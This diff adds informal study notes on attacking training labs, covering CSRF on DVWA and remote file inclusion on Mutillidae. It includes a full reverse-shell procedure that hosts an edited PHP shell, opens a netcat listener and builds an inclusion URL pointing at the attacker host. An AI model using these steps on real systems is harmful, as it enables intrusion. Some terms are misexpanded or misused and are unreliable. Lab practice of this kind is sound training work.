@@ -1,0 +1,77 @@
+https://www.reddit.com/r/computerviruses/comments/14d0876/mr_robot_vm_virus/
+
+CROSS-SITE REQUEST FORGERY (CSRF/XSRF)
+Limitation:
+1) The user has to be logged in on the target website
+2) The target website must be authenticating via Cookies and not via Headers
+
+DVWA
+CSRF
+Login as user
+Perform any transaction (In our case Change the password)
+Capture the request
+Right click on the request
+-> Engagement Tools
+-> Generate CSRF PoC (Proof of Concept)
+A CSRF HTML is generated
+Edit the parameters(In our case New Password and Confirm Password)
+Send the changed HTML page to the victim
+	Host the CSRF HTML page on a server
+		Using Python create a virtual server on the local machine
+			Open the terminal in the directory where the CSRF HTML is residing
+			Command: sudo python3 -m http.server 80
+Open the browser and type the IP address of the machine containing CSRF HTML page
+When the victim opens the masquerading file, the malware is executed
+Actual parameters(password changed by the victim) will be nulled
+The parameters changed by the attacker will be valid
+
+
+
+RFI (Remote File Inclusion)
+
+Mutillidae 2
+Open the Login page
+Create a Remote File
+	Open the php-reverse-shell.php file
+		Open the destination of the file to be copied in the Terminal
+		Copy the file from source to destination
+		Command: cp /usr/share/webshells/php/php-reverse-shell.php .		//Copying file from source to destination
+					The above is the source						   The above is the destination(. means pwd)
+		Open the php-reverse-shell.php in a text editor
+		Edit the parameter $ip
+		From $ip= '127.0.0.1';
+		To $ip= '10.0.2.7';			//IP address of the attacker
+		Copy the $port parameter
+Create a listener in the terminal
+Command: nc -nvlp <$port parameter>
+		 Ex: nc -nvlp 1234
+Host the edited file in server
+Copy the link address of the edited php page(php-reverse-shell.php)
+Paste it onto the URL
+Ex: http://10.0.2.6/mutillidae/index.php?page=http://10.0.2.15/php-reverse-shell.php
+The malware(php-reverse-shell.php) is executed
+The Terminal where the listener was turned on, it has access to the shell
+
+
+
+
+Prevention of Attacks
+WAF (Web Application Firewall)
+Security Headers
+	Ex: Response of Google
+		Cache control
+		STS (Strict Transport Security)
+		CSP (Content Service Policy)
+		Whitelist (Cross Origin Allow Header)
+		XSS Protection
+		
+CWE (Common Web-application Exposures)
+
+
+
+To Learn Hacking
+bugcrowd
+hackerone
+	hackerone conference
+intigriti
+codeRed academy
